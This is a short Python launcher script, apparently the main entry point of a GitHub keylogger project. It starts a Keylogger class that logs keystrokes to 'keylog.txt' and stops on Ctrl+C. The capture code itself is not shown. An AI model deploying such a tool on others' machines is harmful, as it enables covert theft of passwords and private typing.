#!/usr/bin/env python3
"""
Main entry point for keylogger.
Created by: Yash (Popeye) - github.com/yashraut369
"""

from keylogger import Keylogger

if __name__ == "__main__":
    # Initialize and start the keylogger
    keylogger = Keylogger(log_file="keylog.txt")
    print("Keylogger started. Press Ctrl+C in terminal to stop.")
    try:
        keylogger.start()
    except KeyboardInterrupt:
        # Handle graceful exit when Ctrl+C is pressed
        print("\nKeylogger stopped.")
        keylogger.stop()
